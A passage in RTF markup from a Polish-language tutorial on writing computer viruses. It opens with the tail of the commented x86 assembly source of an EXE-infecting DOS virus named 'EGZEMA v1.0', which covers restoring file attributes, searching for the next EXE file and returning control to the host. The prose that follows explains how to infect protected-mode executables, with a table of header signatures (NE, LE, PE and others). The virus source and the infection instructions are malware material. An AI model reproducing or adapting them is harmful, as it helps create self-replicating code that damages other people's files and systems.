\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZamknijPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Eh                           ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocAtrybut:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cl,[si][NoweDTA.DTAAttr]         ; podaj stary atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ch,0                             ; CX=CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajNastepnyPlik:                        ; poprzedni plik byl zarazony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Fh                           ; funkcja DOS - szukaj innego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pliku EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   KolejnyPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BezInfekcji:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  es                               ; \\ es=ds=PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,80h                           ; przywroc pierwotne DTA=PSP:80h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,1Ah                           ; funkcja DOS - ustaw nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; \\ zdejmij ze stosu wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   dx                               ; / SS i SP nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ss,dx                            ; \\ i umiesc te wartosci w}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   sp,ax                            ; / SS i SP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db 0EAh                                ; powroc do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     SkokIP dw ?                            ; \\ czesc skoku JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     SkokCS dw ?                            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MaskaEXE   db '*.EGZE'                     ; maska plikow EXE (ASCIIZ)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Naglowek   db 26 dup(?)                    ; bufor zawiera zapamietane bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; z poczatku programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; tu : kod rozkazu int 20h/NOP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Czesc Informayjna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Informacja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,09h                           ; funkcja DOS - wyswietl tekst$}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,01h                           ; funkcja DOS - czytaj znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; ze standardowego wejscia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; AL zawiera znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zapamietaj na chwile znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,0E0Dh                         ; \\  przejdz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ;  \\ do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,0E0Ah                         ;  / nastepnej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; /  linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,11011111b                     ; konwertuj znak na wielka litere}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,'T'                           ; czy potwierdzona infekcja ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     clc                                    ; ustaw flage na TAK}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    CLCRet                           ; TAK i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     stc                                    ; ustaw flage na NIE i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CLCRet:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeInformacja db CR,LF,'EGZEMA v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF,'Czy chcesz uruchomic wirusa (T/N) ?'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db DOLAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              StaryCS dw 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              StaryIP dw offset Nosiciel}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              StarySS dw 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              StarySP dw offset Nosiciel+100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusEnd:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweDTA   DTAStruc <?,?,?,?,?,?>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nosiciel:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           mov  ax,4C00h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           int  21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EGZEMA ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END VirusStart}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2.2. Pliki EXE dla trybu chronionego (nowe EXE)}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Du\uc1\u380\'bfa cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 istniej\uc1\u261\'b9cych obecnie plik\'f3w EXE to tzw. nowe EXE. Maj\uc1\u261\'b9 one inn\uc1\u261\'b9 budow\uc1\u281\'ea ni\uc1\u380\'bf pliki przeznaczone dla systemu DOS. Na ich pocz\uc1\u261\'b9tku znajduje si\uc1\u281\'ea kr\'f3tki programik dzia\uc1\u322\'b3aj\uc1\u261\'b9cy w systemie DOS, tzw. STUB, maj\uc1\u261\'b9cy za zadanie b\uc1\u261\'b9d\uc1\u378\'9f wy\uc1\u347\'9cwietlenie komunikatu, i\uc1\u380\'bf plik zawiera program nie dzia\uc1\u322\'b3aj\uc1\u261\'b9cy w systemie DOS, b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf pr\'f3b\uc1\u281\'ea uruchomienia zawartego w pliku w\uc1\u322\'b3a\uc1\u347\'9cciwego programu dla trybu chr}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}nionego pod kontrol\uc1\u261\'b9 odpowiedniego dla niego \uc1\u347\'9crodowiska, najcz\uc1\u281\'ea\uc1\u347\'9cciej u\uc1\u380\'bfywaj\uc1\u261\'b9cego trybu chronionego, np. WINDOWS, DOS4GW. Nawiasem m\'f3wi\uc1\u261\'b9c, fakt istnienia programu STUB stwarza mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 napisania programu dzia\uc1\u322\'b3aj\uc1\u261\'b9cego r\'f3wnocze\uc1\u347\'9cnie pod dwoma systemami, np. }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}od DOS i WIN-DOWS. To, kt\'f3ry z program\'f3w by\uc1\u322\'b3by wykonywany by\uc1\u322\'b3oby zale\uc1\u380\'bfne od systemu, pod kt\'f3rym by\uc1\u347\'9cmy aktualnie pracowali. Program dla DOS-a pe\uc1\u322\'b3ni\uc1\u322\'b3by tu rol\uc1\u281\'ea programu STUB.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po programie STUB znajduje si\uc1\u281\'ea w\uc1\u322\'b3a\uc1\u347\'9cciwy program przeznaczony dla trybu chronionego, posiadaj\uc1\u261\'b9cy, podobnie jak programy dla DOS, odpowiednio sformatowany nag\uc1\u322\'b3\'f3wek. R\'f3\uc1\u380\'bfne systemy maj\uc1\u261\'b9 r\'f3\uc1\u380\'bfn\uc1\u261\'b9 struktur\uc1\u281\'ea tego nag\uc1\u322\'b3\'f3wka, tak wi\uc1\u281\'eac infekcja takich program\'f3w jest o wiele trudniejsza ni\uc1\u380\'bf w przypadku plik\'f3w przeznaczonych dla DOS. Komplikacje przy p}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}saniu wirus\'f3w infekuj\uc1\u261\'b9cych takie pliki wynikaj\uc1\u261\'b9 tak\uc1\u380\'bfe ze znacznych r\'f3\uc1\u380\'bfnic, jakie wyst\uc1\u281\'eapuj\uc1\u261\'b9 pomi\uc1\u281\'eadzy trybem chronionym, dla kt\'f3rego s\uc1\u261\'b9 one przeznaczone, a trybem rzeczywistym, u\uc1\u380\'bfywanym przez DOS. Potencjalny tw\'f3rca takiego wirusa musi uwzgl\uc1\u281\'eadnia\uc1\u263\'e6 przy jego}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}programowaniu podstawowe cechy system\'f3w wielozadaniowych: podzia\uc1\u322\'b3 i ochron\uc1\u281\'ea zasob\'f3w, fakt stronicowania pami\uc1\u281\'eaci, po\uc1\u322\'b3\uc1\u261\'b9czonego z wymiataniem nie u\uc1\u380\'bfywanych obszar\'f3w pami\uc1\u281\'eaci na dysk (ang. swapping\} oraz podzia\uc1\u322\'b3 programu na oddzielne bloki danych, kodu i stosu}{\f1\fs24\lang1045{\*\listtag0},}{\f0\fs24\lang1045{\*\listtag0} posiadaj\uc1\u261\'b9cych odpowiednie prawa dost\uc1\u281\'eapu, zawarte w deskryptorach. Mo\uc1\u380\'bfna powiedzie\uc1\u263\'e6, i\uc1\u380\'bf bez dobrej znajomo\uc1\u347\'9cci trybu chronionego napisanie wirusa dla nowych EXE jest niemo\uc1\u380\'bfliwe. Dow\'f3d na to stanowi stosunkowo ma\uc1\u322\'b3a liczba wirus\'f3w pisanych pod systemy Window}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0} 3.l, Windows 95 czy OS/2 (inn\uc1\u261\'b9 wa\uc1\u380\'bfn\uc1\u261\'b9 przyczyn\uc1\u261\'b9 tego stanu rzeczy jest utrudniony dost\uc1\u281\'eap do dok\uc1\u322\'b3adnych informacji o tych systemach).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekuj\uc1\u261\'b9c pliki nowe EXE (za pomoc\uc1\u261\'b9 opisanej w poprzednim rozdziale metody) musimy na pocz\uc1\u261\'b9tku sprawdzi\uc1\u263\'e6, czy rzeczywi\uc1\u347\'9ccie jest to plik tego typu. Por\'f3wnujemy dwa pierwsze bajty pliku z sekwencj\uc1\u261\'b9 'MZ' lub 'ZM' (na tym etapie nie jest wa\uc1\u380\'bfne, dla jakiego systemu przeznaczony jest plik). Nast\uc1\u281\'eapnie, je\uc1\u380\'bfeli por\'f3wnanie wypad\uc1\u322\'b3o pomy\uc1\u347\'9clnie, nale\uc1\u380\'bfy sprawdzi\uc1\u263\'e6, czy na pozycji 18h-19h w n}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}g\uc1\u322\'b3\'f3wku starego EXE znajduje si\uc1\u281\'ea warto\uc1\u347\'9c\uc1\u263\'e6 40h lub wi\uc1\u281\'eaksza. Je\uc1\u347\'9cli tak, to nale\uc1\u380\'bfy spr\'f3bowa\uc1\u263\'e6 odczyta\uc1\u263\'e6 ewentualny nag\uc1\u322\'b3\'f3wek nowego EXE, w kt\'f3rym znajduje si\uc1\u281\'ea odpowiedni znacznik (dwa znaki ASCII) informuj\uc1\u261\'b9cy o systemie, dla kt\'f3rego program jest przeznaczony. Typ}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}we znaczniki zawarto w poni\uc1\u380\'bfszej tabeli.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Znaczniki rozszerzonego nag\uc1\u322\'b3\'f3wka nowych plik\'f3w EXE}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.0126in/5.5758in/; table-sdh:891ff50}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Znacznik}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Docelowy system}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}NE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Windows lub OS/2 1.x, z podzia\uc1\u322\'b3em na segmenty}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}LE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Windows virtual device driver (VxD) z liniowym adresowaniem (Linear Executable)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}LX}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wariant LE, u\uc1\u380\'bfywany przez OS/2 2.x}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}W3}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Plik WIN386.EXE dla Windows; kolekcja plik\'f3w LE}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}PE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Windows NT lub Win32s (Portable Executable)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DL}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}HP 100LX/200LX (Pliki *.EXM)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
